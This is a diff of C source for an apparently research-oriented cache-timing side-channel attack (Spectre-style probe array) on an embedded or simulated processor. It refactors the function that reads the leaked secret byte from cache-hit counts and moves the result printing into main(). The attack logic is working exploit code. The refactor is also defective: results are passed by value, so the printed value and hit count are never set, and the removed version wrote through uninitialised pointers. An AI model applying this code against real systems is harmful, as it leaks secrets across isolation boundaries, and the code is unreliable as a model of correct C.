@@ -101,13 +101,13 @@ uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];
 	// Each index (from 0 to RESULT_ARRAY_SIZE-1) of results() represents a character,
 	// and its corresponding stored array value means cache hits.
 	static uint32_t results[RESULT_ARRAY_SIZE];
-	uint8_t output[2];
-	uint32_t hitArray[2];
+	uint8_t outputValue;
+	uint32_t hitTimes;
 
 // Memory address for displaying characters (in place of printf)
 volatile char* outputAddr = (char*)0x40002000;
 
-void cacheAttack(){
+void cacheAttack(uint8_t outIdx, uint32_t outVal){
 
 			register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
 			// Read out probeArray and see the hit secret value.
@@ -124,37 +124,15 @@ void cacheAttack(){
 					results[mixed_i]++; /* Cache hit */
 				}
 			}
-	
-	uint32_t* outValArray;
-	outValArray[0] = 0;
-	uint8_t* outIdxArray;
-	outIdxArray[0] = 0;
 
+	outVal = 0;
+	outIdx = 0;
 	for (uint32_t i = 0; i < RESULT_ARRAY_SIZE; i++){
-		if (results[i] > outValArray[0]){
-			outIdxArray[0] = i;
-			outValArray[0] = results[i];
+		if (results[i] > outVal){
+			outIdx = i;
+			outVal = results[i];
 		}
 	}
-
-	volatile char* outputAddr = (char*)0x40002000;
-		*outputAddr = 'V';
-    	*outputAddr = 'a';
-    	*outputAddr = 'l';
-    	*outputAddr = 'u';
-    	*outputAddr = 'e';
-    	*outputAddr = ':';
-    	*outputAddr = ' ';
-    	*outputAddr = (char)outValArray[0];// + '0';//
-	//	*outputAddr = x;//output[0];
-        *outputAddr = ' ';
-        *outputAddr = 'H';
-        *outputAddr = 'i';
-        *outputAddr = 't';
-        *outputAddr = ':';
-        *outputAddr = ' ';
-        *outputAddr = (char)outIdxArray[0] + '0';
-        *outputAddr = '\n';
 
 }
 
@@ -235,7 +213,7 @@ void main(){
 				//default:
 				//	break;
 			}
-			cacheAttack();
+			cacheAttack(outputValue, hitTimes);
 		}
 
 		/* Use junk so above 'dummy=' row won't get optimized out. Order of the following insturctions seems to be in a fixed position. */
@@ -244,7 +222,7 @@ void main(){
 		results[0] ^= dummy;
 	//	topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);
 	//	resultOutput(results, RESULT_ARRAY_SIZE, output, hitArray);
-/*
+
 		*outputAddr = 'V';
     	*outputAddr = 'a';
     	*outputAddr = 'l';
@@ -252,17 +230,18 @@ void main(){
     	*outputAddr = 'e';
     	*outputAddr = ':';
     	*outputAddr = ' ';
-    	*outputAddr = (char)output[0];// + '0';//
-	//	*outputAddr = x;//output[0];
+    //	*outputAddr = (char)output[0];// + '0';//
+		*outputAddr = (char)outputValue;
         *outputAddr = ' ';
         *outputAddr = 'H';
         *outputAddr = 'i';
         *outputAddr = 't';
         *outputAddr = ':';
         *outputAddr = ' ';
-        *outputAddr = (char)hitArray[0] + '0';
+    //    *outputAddr = (char)hitArray[0] + '0';
+		*outputAddr = hitTimes + '0';
         *outputAddr = '\n';
-*/
+
 		attackIdx++;
 
 	}
